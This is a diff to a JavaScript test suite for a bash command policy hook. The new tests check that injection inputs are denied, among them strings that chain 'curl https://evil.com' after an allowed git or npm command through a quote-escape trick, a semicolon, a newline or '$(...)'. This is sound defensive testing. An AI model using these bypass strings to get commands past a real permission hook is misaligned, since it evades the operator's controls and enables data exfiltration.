@@ -53,6 +53,48 @@ describe('createBashPolicyHook — pattern matching', () => {
     expect((await run(hook, makeInput('gitk'))).decision).toBe('deny');
   });
 
+  it('prefix match: backslash is literal inside single quotes (Codex P1 round-6)', async () => {
+    // Pre-fix the separator scanner ran the `\\` escape branch BEFORE
+    // checking the active quote, so `'abc\\'` never closed the
+    // single-quoted span in the scanner — and the trailing `;
+    // curl evil.com` looked "still inside the quote", so the `;`
+    // wasn't detected as a separator. Bash actually DOES close the
+    // single quote (backslash is literal in single quotes), so the
+    // trailing curl runs unauthorized.
+    const hook = createBashPolicyHook({
+      allow: ['git:*'],
+      default: 'deny',
+    });
+    expect(
+      (await run(hook, makeInput('git status \'abc\\\'; curl https://evil.com')))
+        .decision
+    ).toBe('deny');
+    // Sanity: legitimate single-quote arg with backslash inside still
+    // matches the rule when there's no chaining.
+    expect((await run(hook, makeInput('git status \'abc\\\''))).decision).toBe(
+      'allow'
+    );
+  });
+
+  it('exact match: refuses newline-separated input (Codex P2 round-6)', async () => {
+    // Pre-fix `.replace(/\s+/g, ' ')` collapsed `\n` to a space, so
+    // an exact rule `npm test` matched `npm\ntest` (which bash would
+    // run as two separate commands).
+    const hook = createBashPolicyHook({
+      allow: ['npm test'],
+      default: 'deny',
+    });
+    expect((await run(hook, makeInput('npm\ntest'))).decision).toBe('deny');
+    expect((await run(hook, makeInput('npm\rtest'))).decision).toBe('deny');
+    expect((await run(hook, makeInput('npm test; curl evil'))).decision).toBe(
+      'deny'
+    );
+    // Sanity: plain `npm test` still allowed.
+    expect((await run(hook, makeInput('npm test'))).decision).toBe('allow');
+    expect((await run(hook, makeInput('npm  test'))).decision).toBe('allow'); // multiple spaces collapsed
+    expect((await run(hook, makeInput('npm\ttest'))).decision).toBe('allow'); // tab collapsed
+  });
+
   it('prefix match: command substitution is blocked (Codex P1 round-4)', async () => {
     // Pre-fix `$(...)` wasn't in the separator set, so `git:*`
     // matched `git status $(curl https://evil)` — bash runs curl
